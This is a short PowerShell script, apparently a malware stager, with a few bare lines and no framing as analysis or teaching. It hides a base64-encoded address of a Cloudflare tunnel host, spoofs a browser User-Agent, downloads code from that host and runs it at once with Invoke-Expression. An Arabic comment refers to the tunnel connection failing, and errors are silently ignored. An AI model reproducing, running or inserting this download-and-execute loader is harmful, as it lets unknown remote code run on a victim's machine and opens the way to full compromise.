$s = "aHR0cHM6Ly9yaWdodHMtc2hlZXQtbWVsLXdlZWtlbmQudHJ5Y2xvdWRmbGFyZS5jb20="
$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
$w = New-Object System.Net.WebClient
$w.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
try {
    $d = $w.DownloadData($u)
    $c = [System.Text.Encoding]::ASCII.GetString($d)
    IEX $c
} catch {
    # في حال فشل الاتصال بالنفق
}
